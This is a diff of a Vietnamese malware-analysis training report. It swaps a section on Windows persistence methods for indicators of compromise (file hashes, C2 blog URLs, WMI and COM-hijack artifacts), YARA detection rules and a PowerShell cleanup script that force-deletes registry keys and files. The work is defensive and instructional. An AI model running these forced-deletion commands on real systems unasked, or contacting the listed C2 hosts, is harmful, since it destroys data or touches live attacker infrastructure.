-  - Mẫu mã độc sau khi yêu cầu đặc quyền Administrator qua UAC Prompt, sử dụng Windows Service APIs (`OpenSCManagerA`, `CreateServiceA`) để cài đặt một dịch vụ hệ thống độc lập.
-  - Tệp nhị phân được sao chép vào `C:\Windows\System32\drivers\` để tạo cảm giác đây là một trình điều khiển hoặc dịch vụ chuẩn của Windows.
-  - Do chạy dưới tài khoản `LocalSystem`, mã độc hoàn toàn miễn nhiễm với sự hạn chế quyền của các tài khoản người dùng thông thường và duy trì hoạt động liên tục 24/7 kể cả khi không có ai đăng nhập máy.
-- **Biện pháp bóc gỡ (Remediation):**
-  1. Dừng và vô hiệu hóa dịch vụ qua CMD Administrator:
-     ```cmd
-     sc stop WerSvcHelper
-     sc config WerSvcHelper start= disabled
-     sc delete WerSvcHelper
-     ```
-  2. Khởi động lại vào chế độ Safe Mode nếu tệp bị khóa và xóa: `C:\Windows\System32\drivers\wersvchelper.exe`.
+### 6.1. Mã băm Tệp tin (File Hashes)
 
----
-
-### 2.3.5. Biểu mẫu chuẩn trích xuất IOC Persistence phục vụ Incident Response
-
-Khi phát hiện sự cố mã độc trong môi trường doanh nghiệp, chuyên viên ứng cứu sự cố (DFIR) cần điền bảng tổng hợp IOC Persistence dưới đây:
-
-| Mục khảo sát | Mẫu 01 (Trojan RAT) | Mẫu 02 (Downloader) | Mẫu 03 (Loader/Service) |
+| Tệp tin | Kích thước | MD5 | SHA256 |
 | :--- | :--- | :--- | :--- |
-| **Kỹ thuật Persistence** | Registry Run Key | Scheduled Task | Windows Service |
-| **Nhóm trong Autoruns** | Logon | Scheduled Tasks | Services |
-| **Đường dẫn tệp mã độc** | `%APPDATA%\...\svchost_updater.exe` | `C:\ProgramData\...\health_check.ps1` | `C:\Windows\System32\drivers\wersvchelper.exe` |
-| **Khóa Registry tác động** | `HKCU\...\CurrentVersion\Run` | `HKLM\...\Schedule\TaskCache` | `HKLM\SYSTEM\CurrentControlSet\Services` |
-| **Đặc quyền hoạt động** | Standard User | High Privilege (Elevated) | `NT AUTHORITY\SYSTEM` |
-| **Tần suất kích hoạt** | Mỗi khi User đăng nhập | Mỗi 1 giờ và khi Logon | Tự động khi Boot máy tính |
-| **Lệnh bóc gỡ nhanh** | `reg delete HKCU\...\Run /v ...` | `schtasks /delete /tn ...` | `sc delete WerSvcHelper` |
+| `a.exe` | 20,481 B | `bc45beb8b862d2136a070ae793685386` | `2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9` |
+| `malw.rtf` | 949,986 B | `0a5a0c889fd8772da489a327d4fdd8d6` | `61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2` |
+| `main_background.png` (x86) | 297,472 B | `5f7f60e9fcc992794feb2d6e9908d1c3` | `18cc477fb8f4c147f3c31d0fdbb5ab8fdff12a75bb9b23e3c3927090537eff41` |
+| `main_background.png` (x64) | 292,352 B | `3b36fb3a8cf15b0c5a288329e357e916` | `fd33b2952127554ffcf3940a35fa18a0cb035847eb685a5b6a94555cd825baeb` |
+| `McAfee.exe` | 140,576 B | `884d46c01c762ad6ddd2759fd921bf71` | `3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe` |
+| `McUtil.dll` | 3,072 B | `fe6f322a0c3e25947988d6fad92637b2` | `021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4` |
+| `McUtil.dll.mc` | 116,946 B | `402a04ce4f1ebda0e8e9447b1fb7a4ee` | `58648fed34d7617c3217af047f331cb8e16012b8ae7d4fdebf77e31f6fa79cb5` |
+
+### 6.2. Dấu vết Mạng (Network & C2 Indicators)
+* `http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm`
+* `http://blogs.rediff.com/anilchopra/feed/`
+* `http://www.blogster.com/kapoorsunil09/profile/rss`
+* Chuỗi User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)`
+* Chuỗi User-Agent phụ: `Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5`
+
+### 6.3. Dấu vết Hệ thống & Khóa Registry (Host Artifacts)
+* **WMI Event Consumer:** `ProbeScriptFint` (`root\subscription:ActiveScriptEventConsumer`)
+* **WMI Filter:** `root\subscription:__EventFilter` (`Query = select * from __timerevent where timerid="ProbeScriptFint"`)
+* **COM Hijacking Registry Key:**
+  ```text
+  HKCU\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32
+  ```
+* **Đường dẫn tệp nghi vấn:**
+  * `C:\Windows\system32\Instell.exe`
+  * `C:\Windows\system32\httpcom.log`
+  * `%APPDATA%\main_background.png`
+  * `McUtil.dll.mc`
 
 ---
 
-# PHẦN 3: TỔNG KẾT & KHUYẾN NGHỊ PHÒNG THỦ
+## 7. Quy tắc Nhận diện (YARA Rules) & Khuyến nghị Phòng thủ
 
-## 3.1. Đánh giá tổng quan
-Cơ chế duy trì sự hiện diện (Persistence) là cầu nối mang tính quyết định giữa việc khai thác lỗ hổng ban đầu và việc chiếm quyền kiểm soát máy tính mục tiêu dài hạn. Các cơ chế từ cổ điển (Startup Folder, Run Key) đến phức tạp (COM Hijacking, IFEO, WMI Subscriptions) phản ánh sự am hiểu sâu sắc kiến trúc hệ điều hành của các nhóm tác nhân đe dọa.
+### 7.1. Quy tắc YARA phát hiện
 
-## 3.2. Khuyến nghị phòng thủ dành cho Doanh nghiệp (Blue Team Recommendations)
-1. **Kiểm toán định kỳ với Sysinternals Autoruns:** Xuất baseline danh sách autostart định kỳ (`autorunsc.exe -a * -c`) và so sánh khác biệt (Diffing) để phát hiện mục khởi động mới bất thường.
-2. **Kích hoạt tính năng EDR / Sysmon Monitoring:**
-   - Cấu hình theo dõi Event ID 1 (Process Create), Event ID 11 (File Create trong thư mục Startup/Tasks), Event ID 12/13 (Registry Object Add/Delete trên các khóa Run, IFEO, Services).
-   - Thiết lập cảnh báo đặc biệt khi có tiến trình ghi vào khóa `Image File Execution Options` đối với các tệp trợ năng (`sethc.exe`, `utilman.exe`).
-3. **Áp dụng chính sách đặc quyền tối thiểu (Least Privilege):** Hạn chế tài khoản nhân viên sử dụng quyền Local Administrator để ngăn chặn việc cài đặt Services, Drivers và cấu hình IFEO.
-4. **Bật cơ chế Secure Boot và Driver Signature Enforcement (DSE):** Vô hiệu hóa triệt để AppInit DLLs và ngăn chặn nạp các Kernel Drivers không rõ nguồn gốc.
+```yara
+rule APT30_WMI_ActiveScript_Dropper {
+    meta:
+        description = "Detects APT30 / SPACESHIP WMI Event Consumer Dropper"
+        author = "Security Analysis Team"
+        date = "2026-10-12"
+        hash = "2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9"
+    strings:
+        $s1 = "Instell.exe" ascii
+        $s2 = "httpcom.log" ascii
+        $s3 = "ProbeScriptFint" ascii wide
+        $s4 = "ActiveScriptEventConsumer" ascii wide
+        $s5 = "JavaScript" wide
+    condition:
+        uint16(0) == 0x5A4D and (3 of ($s*))
+}
+
+rule Malw_MHTML_COM_Hijack_Dropper {
+    meta:
+        description = "Detects MHTML Document with COM Hijack VBA Macro"
+        author = "Security Analysis Team"
+        date = "2026-10-12"
+        hash = "61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2"
+    strings:
+        $clsid = "{2DEA658F-54C1-4227-AF9B-260AB5FC3543}" ascii wide
+        $target = "main_background.png" ascii wide
+        $mime = "multipart/related" ascii
+    condition:
+        $mime at 0 and ($clsid or $target)
+}
+
+rule Sideloading_McUtil_Loader {
+    meta:
+        description = "Detects malicious McUtil.dll sideloading component"
+        author = "Security Analysis Team"
+        date = "2026-10-12"
+        hash = "021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4"
+    strings:
+        $mc = "McUtil.dll.mc" wide
+        $valloc = "VirtualAlloc" ascii
+        $rfile = "ReadFile" ascii
+    condition:
+        uint16(0) == 0x5A4D and filesize < 10KB and all of them
+}
+```
+
+### 7.2. Kịch bản Rà soát & Dọn dẹp (PowerShell Incident Response)
+
+Nếu nghi ngờ hệ thống đã kích hoạt các mẫu mã độc này, thực hiện lệnh PowerShell sau (với quyền Administrator):
+
+```powershell
+# 1. Rà soát và gỡ bỏ WMI Event Consumer độc hại (Mẫu A)
+Get-CimInstance -Namespace root\subscription -ClassName ActiveScriptEventConsumer | 
+    Where-Object { $_.Name -eq "ProbeScriptFint" } | 
+    Remove-CimInstance
+
+Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | 
+    Where-Object { $_.Name -eq "ProbeScriptFint" } | 
+    Remove-CimInstance
+
+Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | 
+    Where-Object { $_.Filter.Name -eq "ProbeScriptFint" } | 
+    Remove-CimInstance
+
+# 2. Xóa tệp ngụy trang trong System32
+if (Test-Path "C:\Windows\system32\Instell.exe") {
+    Stop-Process -Name "Instell" -Force -ErrorAction SilentlyContinue
+    Remove-Item "C:\Windows\system32\Instell.exe", "C:\Windows\system32\httpcom.log" -Force
+}
+
+# 3. Rà soát và xóa khóa COM Hijack (Mẫu B)
+$regPath = "HKCU:\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}"
+if (Test-Path $regPath) {
+    Remove-Item -Path $regPath -Recurse -Force
+}
+if (Test-Path "$env:APPDATA\main_background.png") {
+    Remove-Item -Path "$env:APPDATA\main_background.png" -Force
+}
+
+# 4. Rà soát tiến trình McAfee giả mạo chạy từ thư mục ngoài Program Files (Mẫu C)
+Get-Process -Name "McAfee" -ErrorAction SilentlyContinue | ForEach-Object {
+    if ($_.Path -notlike "C:\Program Files\McAfee\*" -and $_.Path -notlike "C:\Program Files (x86)\McAfee\*") {
+        Write-Warning "Phat hien tien trinh McAfee bi sideloading tai: $($_.Path)"
+        Stop-Process -Id $_.Id -Force
+    }
+}
+```
 
 ---
+*Báo cáo được khởi tạo tự động bởi Hệ thống Phân tích Mã độc Chuyên sâu Antigravity.*
+
 *Báo cáo được hoàn thành phục vụ học phần Phân tích Mã độc - Khóa đào tạo An toàn Thông tin.*
